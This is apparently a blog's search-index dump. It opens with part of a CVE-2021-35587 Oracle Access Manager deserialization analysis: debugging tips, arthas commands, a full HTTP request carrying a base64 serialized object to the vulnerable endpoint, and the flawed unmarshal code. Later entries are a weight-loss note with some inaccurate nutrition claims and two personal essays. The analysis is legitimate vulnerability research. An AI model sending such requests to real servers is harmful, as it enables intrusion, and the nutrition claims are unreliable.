有些断点的触发频率非常高，并且大部分触发情况都并不是我们所关心的。这时可以使用条件断点来减少干扰信息。异常断点和方法断点都支持使用条件来筛选。\n例如\n1 2 3 4 断点 java.lang.ClassNotFoundException 条件 this.detailMessage.contains(\u0026#34;internal.util.invoke.Remotable\u0026#34;) Evaluate Expression功能 idea提供的Evaluate Expression功能（快捷键Alt+f8）可以让我们在调试的时候在当前上下文中执行一些Java代码，测试一些表达式并获得结果，观察一些变量的值，是一个非常有用的功能，本文已在多处展示了它的用法。\n如何确定JVM中是否加载了某个类？ 反序列化gadget跳转有时会报找不到类的错误，这个错误往往是native层代码报出来的，不能非常明确认定是什么原因导致的，这是我们会想要知道JVM中是否加载了我们需要的类。一个很好用的工具是arthas，它允许我们attach到Java进程上并在其中探索，在JVM内存中进行有限制的增删改查。我们可以利用arthas来确定JVM中是否加载了某个类。\n参考：https://arthas.aliyun.com/doc/en/quick-start.html\n1 2 3 4 5 6 7 8 9 安装arthas： docker exec -it oamms bash curl -O https://arthas.aliyun.com/arthas-boot.jar java -jar arthas-boot.jar 寻找JVM是否加载了类 sc -d com.tangosol.internal.util.invoke.RemoteConstructor sc -d *RemoteConstructor* sc -d oracle.security.am.proxy.opensso.controller.OpenssoEngineController 如何不调试查看服务端某方法的返回值？ 除了查询JVM中已加载的类的信息外，arthas还有一些很棒的用法。\n举个例子：在arthas终端执行以下命令，然后发送一个包含 oracle.security.am.proxy.opensso.session.utils.SessionID 对象的请求到 /oam/server/opensso/sessionservice 接口后，会打印出成功反序列化后的对象的信息。\n执行命令：\n1 watch oracle.security.am.proxy.opensso.controller.OpenssoEngineController unmarshal returnObj 发送请求：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close Accept-Language: zh-CN,zh;q=0.9 Content-Type: text/xml Content-Length: 906 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;RequestSet vers=\u0026#34;vers123\u0026#34; svcid=\u0026#34;session\u0026#34; reqid=\u0026#34;req_1\u0026#34;\u0026gt; \u0026lt;Request dtdid=\u0026#34;dtd1\u0026#34; sid=\u0026#34;sid1\u0026#34;\u0026gt;\u0026lt;![CDATA[ \u0026lt;authIdentifier reqid=\u0026#34;1\u0026#34; requester=\u0026#34;b2JqZWN0OnJPMEFCWE55QURodmNtRmpiR1V1YzJWamRYSnBkSGt1WVcwdWNISnZlSGt1YjNCbGJuTnpieTV6WlhOemFXOXVMblYwYVd4ekxsTmxjM05wYjI1SlJLOGVKQWl5c3BxUUFnQUhXZ0FJYVhOUVlYSnpaV1JNQUFwamIyOXJhV1ZOYjJSbGRBQVRUR3BoZG1FdmJHRnVaeTlDYjI5c1pXRnVPMHdBRDJWdVkzSjVjSFJsWkZOMGNtbHVaM1FBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB3QURXVjRkR1Z1YzJsdmJsQmhjblJ4QUg0QUFrd0FDbVY0ZEdWdWMybHZibk4wQUE5TWFtRjJZUzkxZEdsc0wwMWhjRHRNQUE5elpYTnphVzl1VTJWeWRtVnlTVVJ4QUg0QUFrd0FCSFJoYVd4eEFINEFBbmh3QUhCMEFBTnVaVzl3YzNJQUVXcGhkbUV1ZFhScGJDNUlZWE5vVFdGd0JRZmF3Y01XWU5FREFBSkdBQXBzYjJGa1JtRmpkRzl5U1FBSmRHaHlaWE5vYjJ4a2VIQS9RQUFBQUFBQUFIY0lBQUFBRUFBQUFBQjRkQUFBY0E9PQ==\u0026#34;\u0026gt; \u0026lt;SessionID\u0026gt;123\u0026lt;/SessionID\u0026gt; \u0026lt;/authIdentifier\u0026gt; ]]\u0026gt; \u0026lt;/Request\u0026gt; \u0026lt;/RequestSet\u0026gt; 看到unmarshal方法返回的对象信息：\n相关代码块：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal private Object unmarshal(String requester) throws Exception { if (requester.startsWith(\u0026#34;token:\u0026#34;)) { return this.createSessionID(requester.substring(\u0026#34;token:\u0026#34;.length())); } else if (requester.startsWith(\u0026#34;object:\u0026#34;)) { ObjectInputStream is = null; try { is = new ObjectInputStream(new ByteArrayInputStream(Base64.decode(requester.substring(\u0026#34;object:\u0026#34;.length())))); } catch (IOException var4) { LOGGER.log(Level.WARNING, \u0026#34;Error in unmarshalling requester\u0026#34;, var4); } return is.readObject(); } else { throw new IllegalArgumentException(\u0026#34;Bad context value:\u0026#34; + requester); } } 此外，如果需要观察 java.* 下的类，要先打开安全开关。比如查看从序列化数据中提取出来的类名：\n1 2 options unsafe true watch java.io.ObjectInputStream readClassDesc returnObj 为何有时挂上调试后应用卡死？ 有时候idea挂到webapp上面调试的时候，用burp发包，很久都没有响应，idea也没有捕获到断点。但如果把所有断点都失效，burp就马上有响应了。\n这种情况可能是因为有断点下在了Java method中（即java.*下的代码），导致断点太经常被触发了。Idea在第一次下这种断点的时候也会有提示：Method breakpoints may dramatically slow down debugging 。\n解决办法是把Java Method Breakpoints这类断点都先deactivate，先在java line breakpoint里面下断，跑起来断下来以后，再开启Javamethod breakpoints里面的断点。\n调试时无法进入java.*包中的代码？ 如果调试进不去readOBject，需要在idea的debugger设置中去除不进入java.io.*类的选项。\narthas附到Java进程后idea调试出问题 如果idea调试会出现各种奇怪的难以理解的问题，可以查看java web的日志看是否和arthas有关，可能是由于arthas在watch某些地方导致的，这时可以尝试先退出arthas，再调试。\n下断点显示灰色怎么办？ 下断点显示灰色，提示 \u0026ldquo;no executable code found at line 46 in class java.io.ObjectOutputStream\u0026rdquo; 。\n原因是idea中使用的JDK版本和远程服务器上使用的JDK版本不同导致源码行数对不上，比如在我的环境中，在oamms server中使用的是1.8.0_281，idea中使用的是1.8.0_333。\n去下载完全相同的版本，从https://www.oracle.com/java/technologies/downloads/archive/\n进到 https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html\n下载jdk-8u281-linux-x64.tar.gz压缩包，在idea中加载JDK，然后就可以了。\n关闭smart step into 有时idea会自动跳过某些代码，我们可以关闭smart step into让它如实执行指令。\n比较字节流 有时需要比较两个字节流是否完全一致，可以使用MD5值来比较\n在idae的evaluate功能中执行。（快捷键：alt+f8）\n1 2 new java.math.BigInteger(1,java.security.MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(constructor.m_definition.m_abClass)).toString(16) new java.math.BigInteger(1,java.security.MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(abClass)).toString(16) 能从jvm卸载一个类/加载一个类的新版本吗？ 不行。参考：\nThere is no way to force1 a class to unload. And unless the old class is unloaded, there is no way to load a new version of a class into the same classloader. (That is because the true identity of a class is a tuple comprising the fully qualified name of the class and the class loader identity.)\nThe solution is to load the new version of the class in a new classloader.\nIt is not clear if this will be practical for you, but unfortunately it is the only option available. The JVM does the \u0026ldquo;duplicate class definition\u0026rdquo; checks in a way that you can\u0026rsquo;t subvert it. The check has security and JVM stability implications.\n——https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror\n如何知道恶意代码是否被执行了？ 最开始想的是在oamms中新建文件 /tmp/cve/12345.sh ，在序列化静态方法中执行这个文件，然后监控access time，如果改动，说明调用到了命令。\n1 2 3 root@ubuntu:~# docker exec -it oamms bash -c \u0026#34;stat /tmp/cve/12345.sh\u0026#34; |grep \u0026#34;Access: 2022\u0026#34; \u0026gt;\u0026gt; /tmp/touchflag.time root@ubuntu:~# cat /tmp/touchflag.time Access: 2022-06-30 03:28:06.663982304 +0000 但实际上这是个坑，Java代码执行到这个文件也不会改变stat。\n最好是挂上调试，下合适的断点，执行流是否走到我们关心的地方就一清二楚了。\n在最终的恶意代码中弹计算器，然后把断点下在 java.lang.Runtime#exec(java.lang.String) 或者 java.lang.Runtime#getRuntime() ，可以非常清楚知道静态代码有没有被成功执行，还能非常清晰地打出整个过程的调用栈。\njava.lang.Runtime#exec(java.lang.String)\n如何保持良好的心态？ 不要愤怒，不要着急，在计算机世界里面，如果哪里出错了，那么一定是你出错了，不会是计算机。 遗留问题：如何跟踪native调用的进出？ 在进入defineClass的rabbit hole 的时候，我意识到，有些地方，如果没有下断点，是会直接跳过的，F7也没有用，关闭idea的smart step into也没有用。比如native函数defineClass1跳出来到transform，又跳回去，然后又出来到RemotableSupport对象的loadClass方法，如果不是我根据错误堆栈在这里下断点，就会直接跳走，我就不会观察到这个现象。又有多少因为我没有下断点而无法观察到的过程呢？怎么解决这个问题，只有解决了这个问题，才能完整跟踪到native函数回调了哪些java层的函数。\n也就是说，动态调试时，当执行流进入native调用就容易跟丢，native调用时还可能在Java和native之间反复跳转，如果没有合适的断点，就会错过很多逻辑，是否有什么方式可以监控native调用的进出点，精准地监视跳转边界，完整地观察到native层调用过程和Java层的交互。还没有找到有效的办法，如果有好主意请联系我。\n扩展阅读 arthas https://arthas.aliyun.com/doc/en/quick-start.html 内存马 Weblogic下的servlet内存马注入-无参照纯调试 Weblogic-内存马分析与实现 Java动态加载字节码的方法 安装Oracle Access Manager Creating Oracle Access Management Docker Containers https://www.oracle.com/hk/security/identity-management/technologies/downloads/ https://docs.oracle.com/cd/E23104_01/download_readme.htm https://github.com/oracle/docker-images/tree/main/OracleAccessManagement oracle虚拟环境：https://www.oracle.com/virtualization/technologies/virtual-appliances.html CDB与PDB ORACLE 12C新特性——CDB与PDB 如何连接到 Oracle RAC 12cR1 中的可插拔数据库？ SQLPLus How to install SqlPlus? Oracle Instant Client Downloads for Linux x86-64 (64-bit) Oracle数据库 Oracle Database Server Docker Image Documentation 漏洞分析 https://twitter.com/testanull/status/1501567794022092805 漏洞作者的分析文章 【最新漏洞预警】CVE-2021–35587 Oracle Access Manager反序列化漏洞分析与命令回显构造 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587 ","permalink":"https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/","summary":"漏洞概况 CVE公告\nVulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587","title":"CVE-2021-35587：Oracle Access Manager反序列化漏洞"},{"content":"概要 减缓进食速度 充足饮水、睡眠、运动 少吃：精米白面、精致碳水、煎炸、油炸、烧烤、火锅、奶茶、可乐、预包装食物、号称无糖的食物 多吃：低卡蔬菜（ 蘑菇、黄瓜、丝瓜、茄子、冬瓜、木耳等，不包含炒土豆、山药、莲藕、胡萝卜、红薯）、不限量黄瓜西红柿圣女果 补充：复合营养素、酸奶益生菌 吃红薯、玉米、山药、土豆、南瓜来替代主食。 烹饪方式：能煮不炒、能炒不煎 细节 减重期间，不喝粥类似物。因为粥类消化快，引起血糖起伏大，很容易饿。 包子、肠粉、玉米、红薯、粉、面、米饭、饼子都属于主食碳水类食物，所以只能选其一，不能又吃红薯，又吃包子。 主食吃少了可能不饱，宁可多吃个鸡蛋，也不要多吃主食类的食物。 面包、蛋糕、饼干等加工类的主食，减重期间不允许吃。 中午的食谱：2个拳头的蔬菜，一个网球大小的肉类。晚上除了主食，其他和中午一样，选择蔬菜和肉。 吃饭的时候多选择蔬菜，把主食的量往下降。 前三天的饮食坚持是比较关键的，因为在降你的胰岛素水平。胰岛素水平降下来了你就没那么饿了。 忌讳高淀粉加高脂肪的食物，比如：梅菜扣肉米饭、隆江猪脚饭、菜汤拌饭。 科学的认知非常重要\n甘油三酯是如何在体内积累的？ 遗传因素（肥胖基因检测） DRD2 改变多巴胺的反应性 FTO 降低细胞对热量的消耗 增加甘油三酯合成能力 增加对碳水食物的依赖 GRM8 该基因与某种行为的上瘾行为有关。（有些人必须吃主食的原因） APOAS 甘油三酯的调节能力降低 能量摄入过多 胰岛素抵抗 （胰岛素相当于能量外卖员，将糖分传递给细胞） 精米白面等含糖高的食物、主食会促进胰岛素分泌，胰岛素含量过多会抑制脂肪肝糖原肌糖原的分解，促进脂肪合成。 糖代谢 脂肪代谢 蛋白质代谢 肠道菌群失衡：有益菌、有害菌。煎炸烧烤、奶茶含有的反式脂肪酸、火锅等会滋生有害菌的生长。 改变基因表达和饥饿素释放，减少饥饿感，缓解病理性摄食 肠道能够调控脂肪合成和存储的基因表达 降低热量吸收 其他因素 年龄：肌肉量流失，代谢减弱 睡眠：睡眠过少会导致胰岛素反应能力下降。越晚越精神是体内的xx已经失衡了。 微量元素：营养维生素矿物质要平衡 疾病状态：甲状腺功能减退、激素药物等 如何管控体重 明确日常热量摄入 测算自身日常热量消耗，基础代谢率/0.8。（啥也不干一天需要的能量，如果是爱运动的是基础代谢率/0.7） 女生，1.5M ,1.3k-1.5k 男生，1.65m ，60公斤 1.7k-1.8k 每日热量摄入不应超过基础代谢量 薄荷营养师 一碗煮熟的米饭 200k 巴掌大的瘦肉 100k-130k 蔬菜 比较低 每日总热量摄入建议不少于800kcal 身体总是先消耗糖原，糖原消耗完才消耗蛋白质和脂肪。 我们希望脂肪减，不希望蛋白质减。蛋白质减了代谢会降低，身体也会有问题。 营养性低热量饮食 降低碳水摄入量： 杜绝预包装食物，可乐，奶茶等； 加压二氧化碳会导致能量失衡，肠道菌群。所谓无糖食物是放了很多脂肪和精致碳水。 可以吃红薯、玉米、山药、土豆、南瓜来替代主食。 主食虽然不甜，碳水比红薯高 充足的蛋白质摄入 低脂食物：煎炸、油炸不吃，外卖的油很多。隆江猪脚饭、梅菜扣肉饭。 高碳水高脂 红烧肉配米饭 蛋糕奶茶 足量的低卡蔬菜 适量的营养素补充 脂肪分解代谢过程中对营养素的需求增加 饮食减少营养素摄入减少 ==要补充复合营养素== 合理控制体重 充足饮水。脂肪中存储有大量垃圾。脂肪代谢酮体分解会导致口腔异味。 每天坚持一定量的运动。每天至少一万步。 消耗能量。 保证肌肉量，防止肌肉流失，代谢下降。 调节肠道菌群。 不排便、大便粘腻、便秘人群 喝酸奶：非自制的酸奶糖分过高。可购买定制的益生菌。 减缓进食速度。一口饭嚼五十次？ 让大脑感觉到饱，停止进食。延长五分钟。 改善心理饥饿感 不是因为饿，因为无聊 不要闲下来 合理疏解情绪 压力肥 皮质醇分泌旺盛时人的精神好。压力大的时候皮质醇分泌旺盛。 每天抽五到十分钟的时间，什么也不做，放空自己，在任何地方发呆。在发呆过程中激素分泌会走向平衡。 瑜伽、冥想和禅坐 腹式呼吸 配餐原则 早餐 替换精致米面：面条包子 半个玉米+一个鸡蛋 三天以后身体适应之后 不限量的黄瓜、西红柿和圣女果 午餐 精致瘦肉。不能是五花肉 蔬菜不限量。绿叶蔬菜不限量；不包含炒土豆、山药、莲藕、胡萝卜、红薯。 4个麻将块 100g 晚餐 不吃主食，或者参照午餐 能煮不炒、能炒不煎 凉拌、白灼，加生抽蚝油：豆芽海带 热量很低 蘑菇、黄瓜、丝瓜、茄子、冬瓜、木耳 西兰花 梨苹果橙子热量相对较高，每次吃不能超过一个。 每周可以放纵8小时。 膳食纤维是有益菌的培养基。 体检报告 身高体重BMI 西红柿蛋汤、蔬菜汤、银耳汤 油用什么 椰子油是饱和脂肪酸，加热再高也很稳定。 橄榄油不能加热，只能凉拌。 植物油是饱和脂肪酸，加热会变成反式脂肪酸，空气中久置也可能会。 轻度脂肪肝：饮食加运动。代谢掉甘油三酯。也可能是酒精性脂肪肝。 减肥成功后 可以把饮食调整到原来状态。 关注体重，升高时轻断食。 益生菌 澳洲 lifespace。菌的数量和范围比较广 怎么判断自己要不要补充益生菌： 是不是每天排便，排出的便是否成型。 6寸长，成型一次性出来；6两重；6分钟。 16+8 ：16个小时不吃东西，8小时之内吃东西。 复合维生素推荐 汤臣倍健 ","permalink":"https://ret2neo.cn/mind/220711-say-goodbye-to-fatty-boy/","summary":"概要 减缓进食速度 充足饮水、睡眠、运动 少吃：精米白面、精致碳水、煎炸、油炸、烧烤、火锅、奶茶、可乐、预包装食物、号称无糖的食物 多吃：低卡蔬菜（ 蘑菇、黄瓜、丝瓜、茄子、冬瓜、木耳等，不包含炒土豆、山药、莲藕、胡萝卜、红薯）、不限量黄瓜西红柿圣女果 补充：复合营养素、酸奶益生菌 吃红薯、玉米、山药、土豆、南瓜来替代主食。 烹饪方式：能煮不炒、能炒不煎 细节 减重期间，不喝粥类似物。因为粥类消化快，引起血糖起伏大，很容易饿。 包子、肠粉、玉米、红薯、粉、面、米饭、饼子都属于主食碳水类食物，所以只能选其一，不能又吃红薯，又吃包子。 主食吃少了可能不饱，宁可多吃个鸡蛋，也不要多吃主食类的食物。 面包、蛋糕、饼干等加工类的主食，减重期间不允许吃。 中午的食谱：2个拳头的蔬菜，一个网球大小的肉类。晚上除了主食，其他和中午一样，选择蔬菜和肉。 吃饭的时候多选择蔬菜，把主食的量往下降。 前三天的饮食坚持是比较关键的，因为在降你的胰岛素水平。胰岛素水平降下来了你就没那么饿了。 忌讳高淀粉加高脂肪的食物，比如：梅菜扣肉米饭、隆江猪脚饭、菜汤拌饭。 科学的认知非常重要\n甘油三酯是如何在体内积累的？ 遗传因素（肥胖基因检测） DRD2 改变多巴胺的反应性 FTO 降低细胞对热量的消耗 增加甘油三酯合成能力 增加对碳水食物的依赖 GRM8 该基因与某种行为的上瘾行为有关。（有些人必须吃主食的原因） APOAS 甘油三酯的调节能力降低 能量摄入过多 胰岛素抵抗 （胰岛素相当于能量外卖员，将糖分传递给细胞） 精米白面等含糖高的食物、主食会促进胰岛素分泌，胰岛素含量过多会抑制脂肪肝糖原肌糖原的分解，促进脂肪合成。 糖代谢 脂肪代谢 蛋白质代谢 肠道菌群失衡：有益菌、有害菌。煎炸烧烤、奶茶含有的反式脂肪酸、火锅等会滋生有害菌的生长。 改变基因表达和饥饿素释放，减少饥饿感，缓解病理性摄食 肠道能够调控脂肪合成和存储的基因表达 降低热量吸收 其他因素 年龄：肌肉量流失，代谢减弱 睡眠：睡眠过少会导致胰岛素反应能力下降。越晚越精神是体内的xx已经失衡了。 微量元素：营养维生素矿物质要平衡 疾病状态：甲状腺功能减退、激素药物等 如何管控体重 明确日常热量摄入 测算自身日常热量消耗，基础代谢率/0.8。（啥也不干一天需要的能量，如果是爱运动的是基础代谢率/0.7） 女生，1.5M ,1.3k-1.5k 男生，1.65m ，60公斤 1.7k-1.8k 每日热量摄入不应超过基础代谢量 薄荷营养师 一碗煮熟的米饭 200k 巴掌大的瘦肉 100k-130k 蔬菜 比较低 每日总热量摄入建议不少于800kcal 身体总是先消耗糖原，糖原消耗完才消耗蛋白质和脂肪。 我们希望脂肪减，不希望蛋白质减。蛋白质减了代谢会降低，身体也会有问题。 营养性低热量饮食 降低碳水摄入量： 杜绝预包装食物，可乐，奶茶等； 加压二氧化碳会导致能量失衡，肠道菌群。所谓无糖食物是放了很多脂肪和精致碳水。 可以吃红薯、玉米、山药、土豆、南瓜来替代主食。 主食虽然不甜，碳水比红薯高 充足的蛋白质摄入 低脂食物：煎炸、油炸不吃，外卖的油很多。隆江猪脚饭、梅菜扣肉饭。 高碳水高脂 红烧肉配米饭 蛋糕奶茶 足量的低卡蔬菜 适量的营养素补充 脂肪分解代谢过程中对营养素的需求增加 饮食减少营养素摄入减少 ==要补充复合营养素== 合理控制体重 充足饮水。脂肪中存储有大量垃圾。脂肪代谢酮体分解会导致口腔异味。 每天坚持一定量的运动。每天至少一万步。 消耗能量。 保证肌肉量，防止肌肉流失，代谢下降。 调节肠道菌群。 不排便、大便粘腻、便秘人群 喝酸奶：非自制的酸奶糖分过高。可购买定制的益生菌。 减缓进食速度。一口饭嚼五十次？ 让大脑感觉到饱，停止进食。延长五分钟。 改善心理饥饿感 不是因为饿，因为无聊 不要闲下来 合理疏解情绪 压力肥 皮质醇分泌旺盛时人的精神好。压力大的时候皮质醇分泌旺盛。 每天抽五到十分钟的时间，什么也不做，放空自己，在任何地方发呆。在发呆过程中激素分泌会走向平衡。 瑜伽、冥想和禅坐 腹式呼吸 配餐原则 早餐 替换精致米面：面条包子 半个玉米+一个鸡蛋 三天以后身体适应之后 不限量的黄瓜、西红柿和圣女果 午餐 精致瘦肉。不能是五花肉 蔬菜不限量。绿叶蔬菜不限量；不包含炒土豆、山药、莲藕、胡萝卜、红薯。 4个麻将块 100g 晚餐 不吃主食，或者参照午餐 能煮不炒、能炒不煎 凉拌、白灼，加生抽蚝油：豆芽海带 热量很低 蘑菇、黄瓜、丝瓜、茄子、冬瓜、木耳 西兰花 梨苹果橙子热量相对较高，每次吃不能超过一个。 每周可以放纵8小时。 膳食纤维是有益菌的培养基。 体检报告 身高体重BMI 西红柿蛋汤、蔬菜汤、银耳汤 油用什么 椰子油是饱和脂肪酸，加热再高也很稳定。 橄榄油不能加热，只能凉拌。 植物油是饱和脂肪酸，加热会变成反式脂肪酸，空气中久置也可能会。 轻度脂肪肝：饮食加运动。代谢掉甘油三酯。也可能是酒精性脂肪肝。 减肥成功后 可以把饮食调整到原来状态。 关注体重，升高时轻断食。 益生菌 澳洲 lifespace。菌的数量和范围比较广 怎么判断自己要不要补充益生菌： 是不是每天排便，排出的便是否成型。 6寸长，成型一次性出来；6两重；6分钟。 16+8 ：16个小时不吃东西，8小时之内吃东西。 复合维生素推荐 汤臣倍健 ","title":"科学减肥"},{"content":" 不知从何时起，我不再喜欢华丽的辞藻和堆叠的长句。\n我开始喜欢平实的语言，和它们所描述的朴素真理。\n来深一年多，比从前接触更多人，生活中发生更多事，但我仍不善与人交际，仍同从前一样思虑过度、不温不凉。\n我所执着的依旧没有答案，但我有些释怀了。\n价值\n意义是断然没有的，价值是需要重估的。\n信仰、道德、责任是死亡焦虑、精神空虚、存在焦虑的糖衣，人人掩耳盗铃，人人都是阿Q。\n勇敢\n第一层的勇敢是敢于问出皇帝是否穿着新衣。敢于藐视一切成规，以独立视角审视自身和周遭，敢于发问，勇于找寻。\n第二层的勇敢是发现答案遍寻无迹时保持乐观，敢于停止追问，做出选择，拥抱内心，拥抱真实的生活。\n必要幻觉\n人之生存，人之悲喜需要幻觉。就这场游戏而言，超脱没有任何好处，如果你真的聪明，就该心甘情愿做一个超级现实主义者。\n能否为自己和世人营造幻觉是入世之路能走多远的先决条件。\n梦想\n确切的价值未被发现不可陈述之时，一切梦想是自欺欺人。\n唯自欺欺人者可成事，清醒者一事无成。\n话语\n你的见闻思虑铸就你的话语，你的话语体现你的真实。当你们在用心听说，灵魂相互抚摸，走在神圣之路。不幸的是人们听不见别人说什么，人们也言不由衷。\n话语即权力，你沉吟浅唱曼妙诗篇，却作为失语者淹没在人群。\n姑娘\n万人如海，男女如流，新鲜感换安全感。\n苦海无涯，浪子们何时回头。\n生活方式\n第一等的生活只洋溢着流年里的片刻悲喜，不问如果当时，不想要是哪天，直面存亡得失悲喜和真我。\n第二等的生活借助符号reflect和revisit，呆头呆脑，愁容满面，敲敲打打没个头绪，啊哈时刻也不过死水微澜。\n幸福\n欲望缺席、欲望产生、欲望满足，哪个时刻真正使你幸福？\n你真正在意什么？你真正愿意做什么，不计回报持之以恒？\n你没有答案，你只是活着。\n继续前行\n穿过流年，不住因果。\n祝你快乐，祝我值得。\n","permalink":"https://ret2neo.cn/mind/220513-age-24/","summary":"不知从何时起，我不再喜欢华丽的辞藻和堆叠的长句。\n我开始喜欢平实的语言，和它们所描述的朴素真理。\n来深一年多，比从前接触更多人，生活中发生更多事，但我仍不善与人交际，仍同从前一样思虑过度、不温不凉。\n我所执着的依旧没有答案，但我有些释怀了。\n价值\n意义是断然没有的，价值是需要重估的。\n信仰、道德、责任是死亡焦虑、精神空虚、存在焦虑的糖衣，人人掩耳盗铃，人人都是阿Q。\n勇敢\n第一层的勇敢是敢于问出皇帝是否穿着新衣。敢于藐视一切成规，以独立视角审视自身和周遭，敢于发问，勇于找寻。\n第二层的勇敢是发现答案遍寻无迹时保持乐观，敢于停止追问，做出选择，拥抱内心，拥抱真实的生活。\n必要幻觉\n人之生存，人之悲喜需要幻觉。就这场游戏而言，超脱没有任何好处，如果你真的聪明，就该心甘情愿做一个超级现实主义者。\n能否为自己和世人营造幻觉是入世之路能走多远的先决条件。\n梦想\n确切的价值未被发现不可陈述之时，一切梦想是自欺欺人。\n唯自欺欺人者可成事，清醒者一事无成。\n话语\n你的见闻思虑铸就你的话语，你的话语体现你的真实。当你们在用心听说，灵魂相互抚摸，走在神圣之路。不幸的是人们听不见别人说什么，人们也言不由衷。\n话语即权力，你沉吟浅唱曼妙诗篇，却作为失语者淹没在人群。\n姑娘\n万人如海，男女如流，新鲜感换安全感。\n苦海无涯，浪子们何时回头。\n生活方式\n第一等的生活只洋溢着流年里的片刻悲喜，不问如果当时，不想要是哪天，直面存亡得失悲喜和真我。\n第二等的生活借助符号reflect和revisit，呆头呆脑，愁容满面，敲敲打打没个头绪，啊哈时刻也不过死水微澜。\n幸福\n欲望缺席、欲望产生、欲望满足，哪个时刻真正使你幸福？\n你真正在意什么？你真正愿意做什么，不计回报持之以恒？\n你没有答案，你只是活着。\n继续前行\n穿过流年，不住因果。\n祝你快乐，祝我值得。","title":"写在24"},{"content":"时值2022年初春，深圳新冠疫情汹涌，居家办公一周。明日复工，我总是在生活的转折点有一些感触。这两日照例在互联网上闲逛，偶遇两个有意思的博客，博主字里行间的思索和行文风格让我觉得亲切，也颇有些启发。我感到，PC互联网时代的神奇之处在于，只要你说得足够多，通过优秀的搜索引擎，或早或晚，愿意听你说话的人会来到你的跟前，而近年来国内的移动互联网巨头们各自为阵，似乎破坏了这种可能性。\n这两个博客是 www.gexiao.me 和 http://blog.metaphox.com 。前者作者看起来与我同龄，我几乎看完了他博客里面每一篇我感兴趣的文章，感到这也是个思虑过多的家伙，算是理解了一些很不错的道理，但想必不怎么快乐。\n后者如今是知乎大V，但早年文章更有意思些，那个为存在和美女、前途和工作而徘徊忧虑的少年是每个男人年轻时的模样吗？时过境迁他又在想些什么呢？还执迷形而上吗？从德国哲学和音乐中理解更多了吗？还执着年少时的梦想吗？娶到美女了吗？接吻的技巧是否炉火纯青？没有人知道，他自己可能也不再盘点这些了。\n但神奇之处在于，一个人对另一个人的死亡的悼念，在十七年后通过一行文字击中另一个完全不相干的人——我知道我终会忘却她的死亡 。\n这让我想起我父亲的父亲的死亡，算是我年少时的一道阴影和一次历练，我也为之也写过文，回头看那文矫饰太甚，可能是年轻的心很难有真正的绝望，只是些悲伤恐惧和无助的梦话罢了。爷爷的死亡已是七年多，2600多天前的事了，我在他离开后又经历了一些新的生活，我寻觅和游荡，工作和消费，见识繁华和落寞，走过哲学和姑娘，我过无数生活中的平凡一种，对于这无数死亡中的平凡一次，也的确是想起得越来越少。也许除了奶奶和父亲，也不会再有其他人想起爷爷。不好说可悲，我能理解，生命就是如此，但人总有奢望。人奢望明天会好，奢望会被爱，奢望能占有，奢望基因的传承，奢望模因的不朽。事实是明天会不同，但不会太不同，事实是人最爱自己，事实是人总能离开，事实是死亡不可避免。\nblog.metaphox.com 的作者爱恋自己的文字，使我有机会读到那个时候的作者在经历那些感受时的想法。仔细想想这很有意思。人很孤独，独自来到，独自行走，独自离开。人可能发出过一些声音，创造过一些东西，有过一些想法和感受，但在岁月呼啸和星海横流中，都不值一提，什么意义也谈不上。十七年的时光在宇宙面前犹如沧海一粟，但在人短暂的一生中却有一定分量。一个人的想法穿越十七年在另一个人心中掀起波澜，不能说这里面没有一点点的浪漫。而写博客，可能就是为了这一点点烂漫，不问下文地表达，没有什么目的，只是搅动这一塘混乱和生命而已。\n忽然想到，生命里遇到的任何值得的人，我们都应该好好珍惜，在星海横流里相遇，本是实实在在的烂漫。好过写博客这种虚无缥缈的烂漫。\nupdate@20230712 读到 https://byvoid.com/zhs/ 的博客，颇有感触，想将博客长久地运营下去。\n","permalink":"https://ret2neo.cn/mind/220320-why-do-i-write-blogs/","summary":"时值2022年初春，深圳新冠疫情汹涌，居家办公一周。明日复工，我总是在生活的转折点有一些感触。这两日照例在互联网上闲逛，偶遇两个有意思的博客，博主字里行间的思索和行文风格让我觉得亲切，也颇有些启发。我感到，PC互联网时代的神奇之处在于，只要你说得足够多，通过优秀的搜索引擎，或早或晚，愿意听你说话的人会来到你的跟前，而近年来国内的移动互联网巨头们各自为阵，似乎破坏了这种可能性。\n这两个博客是 www.gexiao.me 和 http://blog.metaphox.com 。前者作者看起来与我同龄，我几乎看完了他博客里面每一篇我感兴趣的文章，感到这也是个思虑过多的家伙，算是理解了一些很不错的道理，但想必不怎么快乐。\n后者如今是知乎大V，但早年文章更有意思些，那个为存在和美女、前途和工作而徘徊忧虑的少年是每个男人年轻时的模样吗？时过境迁他又在想些什么呢？还执迷形而上吗？从德国哲学和音乐中理解更多了吗？还执着年少时的梦想吗？娶到美女了吗？接吻的技巧是否炉火纯青？没有人知道，他自己可能也不再盘点这些了。\n但神奇之处在于，一个人对另一个人的死亡的悼念，在十七年后通过一行文字击中另一个完全不相干的人——我知道我终会忘却她的死亡 